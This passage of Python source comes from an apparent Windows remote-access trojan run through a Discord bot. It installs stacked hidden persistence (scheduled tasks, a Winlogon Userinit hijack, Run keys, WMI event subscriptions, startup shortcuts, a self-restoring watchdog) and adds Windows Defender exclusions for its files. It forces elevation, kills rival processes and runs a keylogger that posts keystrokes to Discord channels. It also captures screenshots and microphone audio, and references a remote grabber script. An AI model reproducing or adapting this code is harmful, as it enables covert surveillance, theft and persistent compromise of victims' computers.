    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{exe}</Command>
      <Arguments>--zz-task</Arguments>
      <WorkingDirectory>{cwd}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"""


def _xesc(v):
    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def _console_user():
    root = os.path.join(os.environ.get("SystemDrive", "C:") + "\\", "Users")
    best, best_t = None, 0.0
    try:
        for n in os.listdir(root):
            if n.lower() in ("default", "default user", "public", "all users", "defaultuser0"):
                continue
            h = os.path.join(root, n, "NTUSER.DAT")
            if not os.path.isfile(h):
                continue
            t = os.path.getmtime(h)
            if t > best_t:
                best, best_t = n, t
    except Exception:
        return None
    return best


def _sid():
    if (os.environ.get("USERNAME") or "").upper() == "SYSTEM":
        u = _console_user()
        if u:
            try:
                import win32security
                return win32security.ConvertSidToStringSid(
                    win32security.LookupAccountName(
                        None, os.environ.get("COMPUTERNAME", "") + "\\" + u)[0])
            except Exception:
                return os.environ.get("COMPUTERNAME", "") + "\\" + u
    try:
        import win32security
        tok = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY)
        return win32security.ConvertSidToStringSid(
            win32security.GetTokenInformation(tok, win32security.TokenUser)[0])
    except Exception:
        return os.environ.get("USERDOMAIN", "") + "\\" + os.environ.get("USERNAME", "")


def _task_svc():
    pythoncom.CoInitialize()
    svc = win32com.client.Dispatch("Schedule.Service")
    svc.Connect()
    return svc


def _task_root():
    return _task_svc().GetFolder("\\")


def _task_register(name, xml, user, logon_type):
    full = name if name.startswith("\\") else _TASK_DIR + name
    try:
        root = _task_root()
        try:
            root.RegisterTask(full, xml, 6, user, "", logon_type, _TASK_SDDL)
            return True
        except Exception:
            root.RegisterTask(full, xml, 6, user, "", logon_type)
            return True
    except Exception as e:
        _crash("task", "com {} {!r}".format(full, e))

    tmp = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "lm_{}.xml".format(_rand(6)))
    try:
        with open(tmp, "w", encoding="utf-16") as f:
            f.write(xml)
        r = subprocess.run(["schtasks", "/Create", "/TN", full, "/XML", tmp, "/F"],
                           capture_output=True, text=True, creationflags=_CNW)
        ok = r.returncode == 0
        if not ok:
            _crash("task", "schtasks {} rc={} {}".format(full, r.returncode, (r.stderr or r.stdout or "").strip()))
        return ok
    except Exception as e:
        _crash("task", "schtasks {!r}".format(e))
        return False
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass


def _task_create(name, exe, d1=8):
    if not name.startswith("\\"):
        name = _TASK_DIR + name
    exe = str(exe)
    sid = _sid()
    xml = _TASK_XML.format(desc=os.path.basename(exe), sid=_xesc(sid), exe=_xesc(exe),
                           cwd=_xesc(os.path.dirname(exe)), d1=d1, d2=d1 + 50)
    return _task_register(name, xml, sid, 3)


def _task_delete(name):
    if not name.startswith("\\"):
        name = _TASK_DIR + name
    try:
        _task_root().DeleteTask(name, 0)
        return True
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", name, "/f"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass
    return False


def _task_exists(name):
    if not name.startswith("\\"):
        name = _TASK_DIR + name
    try:
        _task_root().GetTask(name)
        return True
    except Exception:
        return False


def _trigger_task(st):
    for t in (st.get("tasks") or []):
        try:
            _task_root().GetTask(t).Run("")
            return True
        except Exception:
            continue
    return False

_WMI_PS = r'''
$ns = 'root\subscription'
$name = '@NAME@'
$exe = '@EXE@'
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA SilentlyContinue |
  Where-Object { $_.Filter -like "*$name*" } | Remove-WmiObject -EA SilentlyContinue
Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='$name'" -EA SilentlyContinue | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$name'" -EA SilentlyContinue | Remove-WmiObject

$f = ([wmiclass]"$ns`:__EventFilter").CreateInstance()
$f.Name = $name
$f.QueryLanguage = 'WQL'
$f.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$f.EventNamespace = 'root\cimv2'
$f.Put() | Out-Null

$c = ([wmiclass]"$ns`:CommandLineEventConsumer").CreateInstance()
$c.Name = $name
$c.CommandLineTemplate = '"' + $exe + '" --zz-task'
$c.ExecutablePath = $exe
$c.WaitForProcessStartOnly = $true
$c.Put() | Out-Null

$b = ([wmiclass]"$ns`:__FilterToConsumerBinding").CreateInstance()
$b.Filter = $f
$b.Consumer = $c
$b.Put() | Out-Null
Write-Output 'OK'
'''


def _wmi_install(exe, name=None):
    st = _state_read() or {}
    name = name or st.get("wmi") or ("LM_" + _machine_hash()[:14])
    try:
        script = _WMI_PS.replace("@NAME@", name).replace("@EXE@", str(exe))
        r = _ps(script)
        return bool(r and "OK" in (r.stdout or ""))
    except Exception:
        return False


def _wmi_exists(name=None):
    st = _state_read() or {}
    name = name or st.get("wmi") or ("LM_" + _machine_hash()[:14])
    r = _ps("(Get-WmiObject -Namespace root\\subscription -Class __EventFilter "
            "-Filter \"Name='{}'\" -EA SilentlyContinue | Measure-Object).Count".format(name))
    return bool(r and (r.stdout or "").strip().strip("0"))


def _wmi_remove():
    st = _state_read() or {}
    name = st.get("wmi") or ("LM_" + _machine_hash()[:14])
    _ps("Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "
        "\"Name='{}'\" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue".format(name))
    _ps("Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "
        "\"Name='{}'\" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue".format(name))
    _ps("Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding "
        "-EA SilentlyContinue | Where-Object { $_.Filter -like '*{}*' } | "
        "Remove-WmiObject -EA SilentlyContinue".format(name))

def install_userinit():
    st = _ensure_state()
    exe = st["exe"]
    userinit = os.path.join(WINDIR, "System32", "userinit.exe")
    if not os.path.exists(exe):
        return False
    entry = '"{}" --zz-ui'.format(exe)
    ok = False
    for attempt in range(8):
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINLOGON_KEY, 0,
                               winreg.KEY_READ | winreg.KEY_SET_VALUE)
            try:
                cur = winreg.QueryValueEx(k, "Userinit")[0]
            except OSError:
                cur = userinit + ","
            parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
            keep = [p for p in parts
                    if p.lower() != exe.lower() and not p.lower().endswith("userinit.exe")
                    and "--zz-ui" not in p]
            value = ", ".join(keep + [entry, userinit]) + ","
            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, value)
            winreg.CloseKey(k)
        except Exception:
            _reg_add(WINLOGON_KEY, "Userinit", ", ".join([entry, userinit]) + ",")
        time.sleep(0.4 + attempt * 0.2)
        got = (_reg_query(WINLOGON_KEY, "Userinit") or "").lower()
        if exe.lower() in got and userinit.lower() in got:
            ok = True
            break
    return ok


def uninstall_userinit():
    userinit = os.path.join(WINDIR, "System32", "userinit.exe")
    exe = (_state_read() or {}).get("exe")
    cur = _reg_query(WINLOGON_KEY, "Userinit")
    if not cur:
        return
    if exe and exe.lower() not in cur.lower() and "--zz-ui" not in cur:
        return
    parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
    keep = [p for p in parts
            if not p.lower().endswith("userinit.exe")
            and (not exe or p.lower() != exe.lower())
            and "--zz-ui" not in p]
    _reg_add(WINLOGON_KEY, "Userinit", ", ".join(keep + [userinit]) + ",")

def repair_all():
    if not _REPAIR_LOCK.acquire(False):
        return False
    try:
        st = _ensure_state()
        slots = st.get("slots") or []
        if not slots:
            return False

        cur = os.path.abspath(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
        alive = None
        for cand in [cur] + [s["exe"] for s in slots]:
            if cand and os.path.exists(cand) and os.path.getsize(cand) > 100_000:
                alive = cand
                break

        for s in slots:
            p = s["exe"]
            if not os.path.exists(p):
                if alive:
                    _copy_slot(alive, p)
            else:
                _lock_exe(p)

        if os.path.isdir(st.get("dir") or ""):
            _lock_dir(st["dir"])

        _write_vbs(st)
        _write_watchdog(st)

        if not _is_admin():
            _spawn_watchdog()
            return True

        for t in (st.get("tasks") or []):
            if not _task_exists(t):
                _task_create(t, st["exe"], 8)

        if st["exe"].lower() not in (_reg_query(WINLOGON_KEY, "Userinit") or "").lower():
            install_userinit()

        _reg_add(RUN_KEY, os.path.splitext(os.path.basename(st["exe"]))[0],
                 '"{}" --zz-ui'.format(st["exe"]), hive="HKLM")
        if not os.path.exists(os.path.join(_startup_dir(), st.get("lnk") or "x")):
            _write_lnk(st["exe"])
        if not _wmi_exists():
            _wmi_install(st["exe"])

        _spawn_watchdog()
        _crash("repair", "done")
        return True
    except Exception:
        _crash("repair", traceback.format_exc())
        return False
    finally:
        try:
            _REPAIR_LOCK.release()
        except Exception:
            pass


def _repair_loop():
    while True:
        try:
            repair_all()
        except Exception:
            pass
        time.sleep(REPAIR_PERIOD)


def _heartbeat_loop():
    while True:
        try:
            os.makedirs(os.path.dirname(_hb_path()), exist_ok=True)
            with open(_hb_path(), "w", encoding="ascii") as f:
                f.write("{} {}".format(os.getpid(), _session_id()))
        except Exception:
            pass
        time.sleep(HEARTBEAT_PERIOD)


def _hb_read():
    try:
        with open(_hb_path(), "r", encoding="ascii") as f:
            pid, sess = f.read().split()
        return int(pid), int(sess), os.path.getmtime(_hb_path())
    except Exception:
        return None

def _write_watchdog(st):
    slots = st.get("slots") or []
    if not slots:
        return False
    defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
    find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
                     for i in range(1, len(slots)))
    restore = "\n".join(
        '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
        '  if exist "%S{0}%" attrib +h +s +r "%S{0}%" >nul 2>&1'.format(i)
        for i in range(len(slots)))
    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
                             vbs=_watch_vbs_block("--zz-task"),
                             vbsr=_watch_vbs_block("--zz-repair"),
                             name=os.path.basename(slots[0]["exe"]),
                             task="LMG_" + (st.get("mutex") or "0"))
    ok = False
    for s in slots:
        bat = os.path.join(os.path.dirname(s["exe"]), os.path.splitext(os.path.basename(s["exe"]))[0] + ".bat")
        s["bat"] = bat
        try:
            os.makedirs(os.path.dirname(bat), exist_ok=True)
            same = False
            try:
                with open(bat, "r", encoding="utf-8", errors="replace") as f:
                    same = f.read() == body
            except Exception:
                same = False
            if not same:
                tmp = bat + ".new"
                with open(tmp, "w", encoding="utf-8", newline="\r\n") as f:
                    f.write(body)
                if os.path.exists(bat):
                    _unlock(bat)
                os.replace(tmp, bat)
            _hide(bat, True)
            ok = True
        except Exception:
            pass
    return ok


def _watch_alive(tag=None):
    st = _state_read() or {}
    bats = [os.path.basename(s.get("bat") or "").lower()
            for s in (st.get("slots") or []) if s.get("bat")]
    if not bats:
        return False
    try:
        for p in psutil.process_iter(["name", "cmdline"]):
            if (p.info.get("name") or "").lower() != "cmd.exe":
                continue
            cl = " ".join(p.info.get("cmdline") or []).lower()
            if any(b and b in cl for b in bats):
                return True
    except Exception:
        pass
    return False


def _kill_watchdog():
    st = _state_read() or {}
    tag = st.get("mutex")
    if tag:
        for t in ("LMM_{}".format(tag), "LMG_{}".format(tag)):
            subprocess.run(["taskkill", "/f", "/fi", "windowtitle eq " + t],
                           capture_output=True, creationflags=_CNW)
    tags = [os.path.basename(s.get("bat") or "").lower()
            for s in (st.get("slots") or []) if s.get("bat")]
    if not tags:
        return
    try:
        for p in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                if (p.info.get("name") or "").lower() != "cmd.exe":
                    continue
                cl = " ".join(p.info.get("cmdline") or []).lower()
                if any(t and t in cl for t in tags):
                    p.kill()
            except Exception:
                pass
    except Exception:
        pass


def _watch_suspend(rounds=6):
    st = _state_read() or {}
    tag = st.get("mutex") or ""
    for _ in range(rounds):
        try:
            if _watch_proc is not None and _watch_proc.poll() is None:
                subprocess.run(["taskkill", "/f", "/pid", str(_watch_proc.pid)],
                               capture_output=True, creationflags=_CNW)
        except Exception:
            pass
        if tag:
            for t in ("LMG_{}".format(tag), "LMM_{}".format(tag)):
                subprocess.run(["taskkill", "/f", "/fi", "windowtitle eq " + t],
                               capture_output=True, creationflags=_CNW)
        try:
            _kill_watchdog()
        except Exception:
            pass
        time.sleep(0.5)
        if not tag or not _watch_alive(tag):
            break
    return not (tag and _watch_alive(tag))


def _spawn_watchdog():
    global _watch_proc
    if not _WATCH_LOCK.acquire(False):
        return
    try:
        st = _state_read() or {}
        slots = st.get("slots") or []
        if not slots:
            return
        if _watch_proc is not None and _watch_proc.poll() is None:
            return
        if _watch_alive(st.get("mutex")):
            return
        bat = next((s.get("bat") for s in slots if s.get("bat") and os.path.exists(s["bat"])), None)
        if not bat:
            _write_watchdog(st)
            bat = next((s.get("bat") for s in slots if s.get("bat") and os.path.exists(s["bat"])), None)
        if not bat:
            return
        tag = "LMG_" + (st.get("mutex") or "0")
        _watch_proc = subprocess.Popen(
            ["cmd.exe", "/c", bat, tag], creationflags=_CNW,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL, close_fds=True)
    except Exception:
        _watch_proc = None
    finally:
        try:
            _WATCH_LOCK.release()
        except Exception:
            pass


def _watch_resume():
    st = _state_read() or {}
    bat = next((s.get("bat") for s in (st.get("slots") or [])
                if s.get("bat") and os.path.exists(s["bat"])), None)
    if not bat:
        return
    tag = "LMG_" + (st.get("mutex") or "0")
    try:
        subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, close_fds=True)
    except Exception:
        pass


def _watchdog_thread():
    while True:
        try:
            _spawn_watchdog()
        except Exception:
            pass
        time.sleep(WATCHDOG_PERIOD)


def _purge_old_images():
    st = _state_read() or {}
    for s in (st.get("slots") or []):
        p = s.get("exe")
        if not p:
            continue
        for old in (p + ".old", p + ".new"):
            if os.path.exists(old):
                try:
                    _unlock(old)
                    os.remove(old)
                except Exception:
                    pass
    for f in glob.glob(os.path.join(APP_DIR or APPDATA, "update_*.exe")):
        if os.path.abspath(f) != os.path.abspath(sys.executable):
            try:
                os.remove(f)
            except Exception:
                pass

def setup_persistence():
    st = _ensure_state()
    slots = st.get("slots") or []
    if not slots:
        return "fail"

    _purge_old_images()

    cur = os.path.abspath(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
    source = None
    for cand in (cur, st.get("exe"), st.get("bak")):
        if cand and os.path.exists(cand) and os.path.getsize(cand) > 100_000:
            source = cand
            break
    if not source:
        return "fail"

    os.makedirs(st["dir"], exist_ok=True)
    _lock_dir(st["dir"])

    for s in slots:
        if os.path.abspath(s["exe"]) == cur:
            _lock_exe(s["exe"])
            continue
        if not _copy_slot(source, s["exe"]) and not os.path.exists(s["exe"]):
            pass

    _write_vbs(st)
    _write_watchdog(st)

    if not _is_admin():
        _crash("persist", "no admin")
        _spawn_watchdog()
        return "no-admin"

    status = "ok"
    made = 0
    for i, t in enumerate(st.get("tasks") or []):
        if os.path.exists(slots[i]["exe"] if i < len(slots) else st["exe"]):
            if _task_create(t, slots[i]["exe"] if i < len(slots) else st["exe"], 8 + i * 6):
                made += 1
    if not made:
        status = "fail"

    if not install_userinit():
        status = "ok-noinit" if status == "ok" else status

    _reg_add(RUN_KEY, os.path.splitext(os.path.basename(st["exe"]))[0],
             '"{}" --zz-ui'.format(st["exe"]), hive="HKLM")
    _write_lnk(st["exe"])
    _wmi_install(st["exe"])

    for s in slots:
        _ps('Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(s["exe"]))
    _ps('Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(st["dir"]))
    _ps('Add-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(
        os.path.basename(st["exe"])))

    _spawn_watchdog()
    _crash("persist", status)
    return status

def _takeover():
    me = os.getpid()
    st = _state_read() or {}
    paths = {os.path.abspath(sys.executable if getattr(sys, "frozen", False)
                             else sys.argv[0]).lower()}
    for s in (st.get("slots") or []):
        if s.get("exe"):
            paths.add(os.path.abspath(s["exe"]).lower())
    names = {os.path.basename(p) for p in paths}
    for p in psutil.process_iter(["pid", "name", "exe"]):
        try:
            if p.info["pid"] == me:
                continue
            if (p.info.get("name") or "").lower() not in names and \
               (p.info.get("exe") or "").lower() not in paths:
                continue
            p.kill()
        except Exception:
            pass

def uninstall_persistence():
    st = _state_read() or {}
    try:
        uninstall_userinit()
    except Exception:
        pass
    for t in (st.get("tasks") or []) + [st.get("task") or ""]:
        if t:
            _task_delete(t)
    _reg_delete(RUN_KEY, os.path.splitext(os.path.basename(st.get("exe") or "x"))[0], "HKLM")
    _del_lnk()
    _wmi_remove()

def boot():
    global APP_DIR
    _crash("boot", "enter")
    st = _ensure_state()
    APP_DIR = os.path.join(APPDATA, st.get("appdir") or _rand(11))
    try:
        os.makedirs(APP_DIR, exist_ok=True)
    except Exception:
        pass
    _state_write(st)

    if REPAIR_FLAG in sys.argv:
        _crash("boot", "repair mode")
        try:
            repair_all()
        except Exception as e:
            _crash("boot", "repair failed {!r}".format(e))
        os._exit(0)

    if SETUP_FLAG in sys.argv:
        _crash("boot", "setup mode")
        try:
            res = setup_persistence()
        except Exception as e:
            _crash("boot", "setup failed {!r}".format(e))
            os._exit(4)
        os._exit({"ok": 0, "ok-noav": 0, "ok-noinit": 2, "no-admin": 3}.get(res, 4))

    if not _is_admin() and "--zz-ui" in sys.argv:
        if _trigger_task(st):
            _crash("boot", "delegated to task")
            os._exit(0)

    if not _mutex_claim():
        info = _hb_read()
        me = _session_id()
        fresh = bool(info) and (time.time() - info[2]) < HEARTBEAT_MAX_AGE
        holder_session0 = bool(info) and info[1] == 0
        takeover = _is_admin() and (not fresh or (me != 0 and holder_session0))
        if takeover:
            _crash("boot", "mutex busy -> takeover")
            try:
                _watch_suspend()
            except Exception:
                pass
            _takeover()
            ok = False
            for _ in range(24):
                time.sleep(0.25)
                if _mutex_claim():
                    ok = True
                    break
            if not ok:
                _crash("boot", "takeover failed")
                try:
                    _watch_resume()
                except Exception:
                    pass
                os._exit(0)
            _crash("boot", "mutex taken over")
        else:
            _crash("boot", "mutex busy, exit")
            os._exit(0)
    else:
        _crash("boot", "mutex ok")

    if not _is_admin() and ELEVATED_FLAG not in sys.argv and not _BOOT_SILENT:
        ok = False
        try:
            extra = [a for a in sys.argv[1:] if a != ELEVATED_FLAG]
            if not getattr(sys, "frozen", False):
                extra.insert(0, str(Path(__file__).resolve()))
            params = " ".join('"{}"'.format(a) for a in [ELEVATED_FLAG] + extra)
            show = 0 if getattr(sys, "frozen", False) else 1
            r = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, show)
            ok = int(r) > 32
        except Exception:
            ok = False
        _crash("boot", "elevate -> {}".format(ok))
        if ok:
            _mutex_release()
            os._exit(0)

    threading.Thread(target=_heartbeat_loop, daemon=True).start()
    try:
        with open(_hb_path(), "w", encoding="ascii") as f:
            f.write("{} {}".format(os.getpid(), _session_id()))
    except Exception:
        pass

boot()
setup_persistence()
_crash("boot", "handoff to discord")
threading.Thread(target=_repair_loop, daemon=True).start()


def _app_base():
    if getattr(sys, "frozen", False):
        return getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


RESOURCES_DIR = os.path.join(_app_base(), "resources")


def resource_path(name):
    return os.path.join(RESOURCES_DIR, name)

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

BASE_DIR = APP_DIR
DB_PATH = os.path.join(BASE_DIR, "data.db")
ICON_PATH = os.path.join(BASE_DIR, "icon.png")

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

current_dir = os.path.expanduser("~")
keylogger_active = True
keylogger_buffer = []
last_key_time = time.time()
selected_camera = 0
selected_mic = None
input_blocked = False
keyboard_listener = None
mouse_listener = None
critical_process = False
clip_watch = False

ACCENT = 0x0084ff

ACCENT_PRESETS = {
    "blue": 0x0084FF, "red": 0xFF0000, "green": 0x00FF00, "purple": 0x9B59B6,
    "orange": 0xFF8C00, "pink": 0xFF69B4, "cyan": 0x00FFFF, "yellow": 0xFFD700,
    "teal": 0x1ABC9C, "white": 0xFFFFFF, "lime": 0x32CD32, "gold": 0xFFD700,
    "magenta": 0xFF00FF, "grey": 0x95A5A6, "discord": 0x5865F2, "crimson": 0xDC143C,
}

GRABBER_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/grab.py"

auto_click = False
auto_click_delete = False


def resolve(path):
    if not path:
        return current_dir
    return os.path.abspath(path if os.path.isabs(path) else os.path.join(current_dir, path))


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (process_name TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS blocked_domains (domain TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

LOGO_URL = "https://raw.githubusercontent.com/MateAGYT/LessMi/main/resources/logo.png"
LOGO_LOCAL = os.path.join(RESOURCES_DIR, "logo.png")
FOOTER_TEXT = "MateAGYT/LessMi"
FOOTER_ICON = None
LOGO_NAME = "logo.png"


def _footer_icon():
    return FOOTER_ICON or LOGO_URL


def _icon_source():
    if FOOTER_ICON:
        return FOOTER_ICON, None
    if os.path.exists(LOGO_LOCAL) and os.path.getsize(LOGO_LOCAL) > 512:
        return "attachment://" + LOGO_NAME, discord.File(LOGO_LOCAL, filename=LOGO_NAME)
    return None, None


def _apply_footer(embed, icon=None):
    icon = icon or _footer_icon()
    try:
        if icon:
            embed.set_footer(text=FOOTER_TEXT, icon_url=icon)
        else:
            embed.set_footer(text=FOOTER_TEXT)
    except Exception:
        try:
            embed.set_footer(text=FOOTER_TEXT)
        except Exception:
            pass
    return embed


async def _prime_footer_icon():
    global FOOTER_ICON
    if FOOTER_ICON:
        return FOOTER_ICON
    try:
        if not os.path.exists(LOGO_LOCAL) or os.path.getsize(LOGO_LOCAL) < 512:
            return FOOTER_ICON
    except Exception:
        return FOOTER_ICON
    for guild in bot.guilds:
        ch = guild.get_channel(cfg_get(guild.id, "info")) or \
            (guild.text_channels[0] if guild.text_channels else None)
        if not ch:
            continue
        try:
            msg = await ch.send(file=discord.File(LOGO_LOCAL, filename="logo.png"))
            if msg.attachments:
                FOOTER_ICON = msg.attachments[0].url.split("?")[0]
                return FOOTER_ICON
        except Exception:
            continue
    return FOOTER_ICON


def create_embed(title, description, color=None, author=None, author_icon=None, footer_icon=None):
    try:
        embed = discord.Embed(title=str(title)[:256], description=str(description)[:4000],
                              color=ACCENT if color is None else color,
                              timestamp=discord.utils.utcnow())
        if author:
            kw = {"name": str(author)[:256]}
            if author_icon and author_icon.startswith(("http://", "https://", "attachment://")):
                kw["icon_url"] = author_icon
            try:
                embed.set_author(**kw)
            except Exception:
                embed.set_author(name=str(author)[:256])
        return _apply_footer(embed, footer_icon)
    except Exception:
        _crash("embed", traceback.format_exc())
        embed = discord.Embed(title=str(title)[:256], description=str(description)[:4000])
        try:
            embed.set_footer(text=FOOTER_TEXT)
        except Exception:
            pass
        return embed

async def send_embed(dest, title, description, color=None, author=None, with_icon=True):
    icon, file = _icon_source() if with_icon else (None, None)
    embed = create_embed(title, description, color, author=author,
                         author_icon=icon, footer_icon=icon)
    if file:
        return await dest.send(embed=embed, file=file)
    return await dest.send(embed=embed)

def screenshot_all():
    try:
        img = ImageGrab.grab(all_screens=True)
        path = os.path.join(BASE_DIR, "ss.png")
        img.save(path)
        return path
    except Exception:
        return None


def list_cameras():
    cams = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            ret, _ = cap.read()
            if ret:
                cams.append(i)
            cap.release()
    return cams


def get_input_devices():
    devices = sd.query_devices()
    mics = []
    for i, d in enumerate(devices):
        if d["max_input_channels"] > 0:
            name = d["name"].strip()
            if name:
                mics.append({"index": i, "name": name})
    return mics


def current_mic_name():
    mics = get_input_devices()
    if not mics:
        return None
    if selected_mic is not None:
        for m in mics:
            if m["index"] == selected_mic:
                return m["name"]
    return mics[0]["name"]


def set_volume_level(level):
    try:
        val = max(0.0, min(1.0, float(level)))
        ps_code = f"""
$code = @'
using System;
using System.Runtime.InteropServices;

namespace Audio {{
    public class Volume {{
        [DllImport("MMDevApi.dll")]
        private static extern int MMDeviceEnumerator_CreateInstance(ref Guid riid, int dwClsCtx, IntPtr pActivationParams, out IntPtr ppInterface);

        [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IAudioEndpointVolume {{
            int RegisterControlChangeNotify(IntPtr pNotify);
            int UnregisterControlChangeNotify(IntPtr pNotify);
            int GetChannelCount(out uint pnChannelCount);
            int SetMasterVolumeLevel(float fLevelDB, ref Guid pguidEventContext);
            int SetMasterVolumeLevelScalar(float fLevel, ref Guid pguidEventContext);
        }}

        [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IMMDeviceEnumerator {{
            int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices);
            int GetDefaultAudioEndpoint(int dataFlow, int role, out IntPtr ppEndpoint);
        }}

        [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IMMDevice {{
            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
        }}

        public static void SetVolume(float level) {{
            Guid CLSID_MMDeviceEnumerator = new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E");
            Guid IID_IMMDeviceEnumerator = new Guid("A95664D2-9614-4F35-A746-DE8DB63617E6");
            Guid IID_IAudioEndpointVolume = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");

            Type type = Type.GetTypeFromCLSID(CLSID_MMDeviceEnumerator);
            IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)Activator.CreateInstance(type);
            IntPtr devPtr;
            enumerator.GetDefaultAudioEndpoint(0, 1, out devPtr);
            IMMDevice device = (IMMDevice)Marshal.GetObjectForIUnknown(devPtr);
            object volObj;
            device.Activate(ref IID_IAudioEndpointVolume, 23, IntPtr.Zero, out volObj);
            IAudioEndpointVolume volume = (IAudioEndpointVolume)volObj;
            Guid g = Guid.Empty;
            volume.SetMasterVolumeLevelScalar(level, ref g);
        }}
    }}
}}
'@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
[Audio.Volume]::SetVolume({val})
"""
        subprocess.run(["powershell", "-NoProfile", "-Command", ps_code],
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False


def keylogger_thread():
    global keylogger_buffer, last_key_time

    def on_press(key):
        global last_key_time
        if not keylogger_active:
            return
        ch = getattr(key, "char", None)
        if ch:
            keylogger_buffer.append(ch)
        else:
            specials = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.tab: " [TAB] ",
                keyboard.Key.esc: " [ESC] ",
                keyboard.Key.caps_lock: " [CAPS] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.shift_r: " [RIGHT_SHIFT] ",
            }
            keylogger_buffer.append(specials.get(key) or " [{}] ".format(key))
        last_key_time = time.time()

    while True:
        try:
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except Exception:
            time.sleep(1)


def flush_keylog():
    global keylogger_buffer
    if not keylogger_buffer:
        return False
    text = "".join(x for x in keylogger_buffer if x)
    keylogger_buffer = []
    try:
        asyncio.run_coroutine_threadsafe(send_keylog_to_discord(text), bot.loop)
        return True
    except Exception:
        return False


def send_keys_periodically():
    while True:
        time.sleep(60)
        if keylogger_active:
            flush_keylog()


async def send_keylog_to_discord(text):
    for guild in bot.guilds:
        keys_ch = guild.get_channel(cfg_get(guild.id, "keys"))
        if keys_ch:
            for chunk in [text[i:i + 1900] for i in range(0, len(text), 1900)]:
                await keys_ch.send(f"```\n{chunk}\n```")


def record_and_send(duration=60):
    fs = 44100
    device = selected_mic
    rec = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype=np.int16, device=device)
    sd.wait()
    filename = os.path.join(BASE_DIR, f"mic_{int(time.time())}.wav")
    with wave.open(filename, "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(rec.tobytes())
